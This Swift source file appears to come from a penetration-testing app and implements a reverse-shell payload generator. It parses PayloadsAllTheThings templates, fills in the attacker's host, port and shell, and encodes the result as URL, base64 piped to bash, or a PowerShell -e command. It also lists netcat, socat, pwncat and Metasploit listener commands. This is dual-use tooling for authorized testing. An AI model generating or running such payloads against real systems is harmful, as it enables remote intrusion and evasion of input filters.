import Foundation

/// One template from the Reverse Shell Cheat Sheet (InternalAllTheThings / PayloadsAllTheThings)
/// in the library, or one of your own one-liners in the "Reverse shells" category.
struct ShellTemplate: Identifiable, Hashable {
    let id: String
    /// "Python", "Python (2)", "Bash TCP", …
    let name: String
    /// Section it came from ("Reverse Shell") or "Your one-liners".
    let group: String
    /// Code-fence language tag, when known.
    let language: String?
    /// The template as written in the sheet, with the sheet's placeholders.
    let code: String
    /// Lead-in text before the code block ("Linux only", …).
    let note: String
    /// A listener block that followed this template in the sheet, if any.
    var listenerHint: String? = nil

    var isPowerShell: Bool {
        let lower = (language ?? "").lowercased()
        return lower == "powershell" || lower == "ps1" || name.lowercased().contains("powershell")
    }
}

/// Reads the templates out of the cheat sheet's Markdown, fills in the addresses, picks a shell
/// and encodes the result. Nothing is bundled: the templates come from the documentation you
/// downloaded into the library (and your own one-liners), so they update with it.
enum ReverseShellCatalog {
    struct Catalog {
        var templates: [ShellTemplate]
        /// Commands from the "Spawn TTY Shell" section, one per line.
        var ttyUpgrades: [String]
        var source: LibraryDocument?
    }

    /// Placeholders the cheat sheet uses (addresses first, so a port inside an address is safe).
    static let hostPlaceholders = ["10.0.0.1", "10.0.0.2", "127.0.0.1"]
    static let portPlaceholders = ["4242", "4444", "3001"]

    /// Listeners for your own machine.
    static let listeners: [(name: String, command: String)] = [
        ("netcat", "nc -lvnp $LPORT"),
        ("netcat with rlwrap (history, arrows)", "rlwrap -cAr nc -lvnp $LPORT"),
        ("ncat", "ncat -lvnp $LPORT"),
        ("socat (plain)", "socat -d -d TCP-LISTEN:$LPORT STDOUT"),
        ("socat (tty, for the socat payload)", "socat file:`tty`,raw,echo=0 TCP-LISTEN:$LPORT"),
        ("pwncat-cs", "pwncat-cs -lp $LPORT"),
        ("Metasploit multi/handler", "msfconsole -q -x \"use exploit/multi/handler; set payload generic/shell_reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; run\""),
    ]

    static let shells = ["/bin/sh", "/bin/bash", "/bin/zsh", "/bin/ash", "/bin/dash", "/bin/ksh", "/usr/bin/fish"]

    enum Encoding: String, CaseIterable, Identifiable {
        case none
        case url
        case doubleURL
        case base64
        case powershellBase64

        var id: String { rawValue }

        var label: String {
            switch self {
            case .none: return "None"
            case .url: return "URL encoded"
            case .doubleURL: return "Double URL encoded"
            case .base64: return "Base64 (… | base64 -d | shell)"
            case .powershellBase64: return "PowerShell -EncodedCommand (UTF-16LE base64)"
            }
        }
    }

    // MARK: - Finding the cheat sheet

    /// The cheat sheet in the library: the document whose name or title mentions a reverse shell
    /// and that yields the most templates.
    static func load(from library: LibraryStore, snippets: SnippetStore) -> Catalog {
        var best: Catalog? = nil
        for collection in library.collections {
            for document in collection.documents {
                let haystack = (document.title + " " + document.fileName).lowercased().replacingOccurrences(of: "-", with: " ")
                guard haystack.contains("reverse shell") || haystack.contains("shell reverse") || haystack.contains("reverse-shell") else { continue }
                let parsed = parse(markdown: library.text(of: document))
                guard !parsed.templates.isEmpty else { continue }
                if best == nil || parsed.templates.count > best!.templates.count {
                    best = Catalog(templates: parsed.templates, ttyUpgrades: parsed.ttyUpgrades, source: document)
                }
            }
        }
        var catalog = best ?? Catalog(templates: [], ttyUpgrades: [], source: nil)
        // Your own templates: one-liners in a "Reverse shells" category, $LHOST / $LPORT as written.
        for snippet in snippets.snippets where snippet.category.lowercased().replacingOccurrences(of: "-", with: " ") == "reverse shells" {
            for (index, step) in snippet.steps.enumerated() {
                let name = snippet.steps.count > 1 ? "\(snippet.title) — \(step.label.isEmpty ? "step \(index + 1)" : step.label)" : snippet.title
                catalog.templates.append(ShellTemplate(id: "snippet:\(snippet.id):\(step.id)", name: name, group: "Your one-liners",
                                                       language: nil, code: step.command, note: ""))
            }
        }
        return catalog
    }

    // MARK: - Parsing the Markdown

    /// Templates = every fenced block under the "Reverse Shell" section's sub-headings; TTY
    /// upgrades = the lines of the blocks under "Spawn TTY Shell".
    static func parse(markdown: String) -> (templates: [ShellTemplate], ttyUpgrades: [String]) {
        let lines = markdown.replacingOccurrences(of: "\r\n", with: "\n").components(separatedBy: "\n")
        var templates: [ShellTemplate] = []
        var tty: [String] = []

        enum Section { case none, reverse, tty }
        var section: Section = .none
        var heading = ""
        var headingCounts: [String: Int] = [:]
        var leadIn = ""
        var fence: String? = nil
        var fenceLanguage: String? = nil
        var block: [String] = []

        func finishBlock() {
            defer { block = []; fenceLanguage = nil }
            let code = block.joined(separator: "\n").trimmingCharacters(in: .whitespacesAndNewlines)
            guard !code.isEmpty else { return }
            switch section {
            case .reverse:
                guard !heading.isEmpty else { return }
                let note = leadIn
                leadIn = ""
                let lowerNote = note.lowercased()
                if lowerNote.contains("listener") || lowerNote.contains("attacker"), !templates.isEmpty {
                    templates[templates.count - 1].listenerHint = code
                    return
                }
                let count = (headingCounts[heading] ?? 0) + 1
                headingCounts[heading] = count
                let name = count == 1 ? heading : "\(heading) (\(count))"
                templates.append(ShellTemplate(id: "sheet:\(name)", name: name, group: "Reverse Shell", language: fenceLanguage, code: code, note: note))
            case .tty:
                for line in code.components(separatedBy: "\n") {
                    let trimmed = line.trimmingCharacters(in: .whitespaces)
                    guard !trimmed.isEmpty, !trimmed.hasPrefix("#"), !tty.contains(trimmed) else { continue }
                    tty.append(trimmed)
                }
            case .none:
                break
            }
        }

        for rawLine in lines {
            let line = rawLine.trimmingCharacters(in: .whitespaces)
            if let open = fence {
                if line.hasPrefix(open) {
                    fence = nil
                    finishBlock()
                } else {
                    block.append(rawLine)
                }
                continue
            }
            if line.hasPrefix("```") || line.hasPrefix("~~~") {
                fence = String(line.prefix(3))
                let tag = line.dropFirst(3).trimmingCharacters(in: .whitespaces)
                fenceLanguage = tag.isEmpty ? nil : tag.lowercased()
                continue
            }
            if line.hasPrefix("#") {
                let level = line.prefix { $0 == "#" }.count
                let title = line.dropFirst(level).trimmingCharacters(in: .whitespaces)
                let lower = title.lowercased()
                if level <= 2 {
                    if lower.contains("reverse shell") && !lower.contains("meterpreter") && !lower.contains("windows") {
                        section = .reverse
                    } else if lower.contains("tty") {
                        section = .tty
                    } else {
                        section = .none
                    }
                    heading = ""
                } else if section == .reverse {
                    heading = title.replacingOccurrences(of: "`", with: "")
                }
                leadIn = ""
                continue
            }
            if !line.isEmpty {
                leadIn = line.replacingOccurrences(of: "**", with: "")
            }
        }
        if fence != nil { finishBlock() }
        return (templates, tty)
    }

    // MARK: - Generating

    /// The template with your address, port and shell filled in. Prompt prefixes from the sheet
    /// ("user@victim$ ") are dropped; "user@attack$" lines belong to the listener and are left out.
    static func fill(_ template: ShellTemplate, lhost: String, lport: String, shell: String) -> String {
        var text = template.code
        let host = lhost.trimmingCharacters(in: .whitespacesAndNewlines)
        let port = lport.trimmingCharacters(in: .whitespacesAndNewlines)
        for placeholder in hostPlaceholders where !host.isEmpty {
            text = text.replacingOccurrences(of: placeholder, with: host)
        }
        for placeholder in portPlaceholders where !port.isEmpty {
            text = replacingWholeNumber(placeholder, with: port, in: text)
        }
        // $LHOST / $LPORT in your own one-liners.
        if !host.isEmpty { text = text.replacingOccurrences(of: "$LHOST", with: host) }
        if !port.isEmpty { text = text.replacingOccurrences(of: "$LPORT", with: port) }
        let chosen = shell.trimmingCharacters(in: .whitespaces)
        if !chosen.isEmpty, chosen.hasPrefix("/") {
            for candidate in ["/bin/bash", "/bin/sh"] where candidate != chosen {
                text = text.replacingOccurrences(of: candidate, with: chosen)
            }
        }
        let kept = text.components(separatedBy: "\n").compactMap { line -> String? in
            let trimmed = line.trimmingCharacters(in: .whitespaces)
            if trimmed.hasPrefix("user@attack$") { return nil }
            if let range = trimmed.range(of: "user@victim$") {
                return String(trimmed[range.upperBound...]).trimmingCharacters(in: .whitespaces)
            }
            return line
        }
        return kept.joined(separator: "\n").trimmingCharacters(in: .whitespacesAndNewlines)
    }

    /// Replaces a number only where it stands on its own (not inside another number).
    static func replacingWholeNumber(_ number: String, with replacement: String, in text: String) -> String {
        guard let regex = try? NSRegularExpression(pattern: "(?<![0-9])" + NSRegularExpression.escapedPattern(for: number) + "(?![0-9])") else { return text }
        let range = NSRange(location: 0, length: (text as NSString).length)
        return regex.stringByReplacingMatches(in: text, options: [], range: range, withTemplate: NSRegularExpression.escapedTemplate(for: replacement))
    }

    static func encode(_ payload: String, as encoding: Encoding, shell: String) -> String {
        switch encoding {
        case .none:
            return payload
        case .url:
            return urlEncode(payload)
        case .doubleURL:
            return urlEncode(urlEncode(payload))
        case .base64:
            let encoded = Data(payload.utf8).base64EncodedString()
            let interpreter = shell.trimmingCharacters(in: .whitespaces).isEmpty ? "bash" : shell
            return "echo \(encoded) | base64 -d | \(interpreter)"
        case .powershellBase64:
            var utf16 = Data()
            for unit in payload.utf16 {
                utf16.append(UInt8(unit & 0xFF))
                utf16.append(UInt8(unit >> 8))
            }
            return "powershell -e \(utf16.base64EncodedString())"
        }
    }

    /// Percent-encodes everything but the unreserved characters (RFC 3986).
    static func urlEncode(_ text: String) -> String {
        let unreserved = CharacterSet(charactersIn: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~")
        return text.addingPercentEncoding(withAllowedCharacters: unreserved) ?? text
    }

    /// Listener command with the port (and address) filled in.
    static func listener(_ command: String, lhost: String, lport: String) -> String {
        var text = command
        let host = lhost.trimmingCharacters(in: .whitespacesAndNewlines)
        let port = lport.trimmingCharacters(in: .whitespacesAndNewlines)
        text = text.replacingOccurrences(of: "$LPORT", with: port.isEmpty ? "$LPORT" : port)
        text = text.replacingOccurrences(of: "$LHOST", with: host.isEmpty ? "$LHOST" : host)
        return text
    }
}
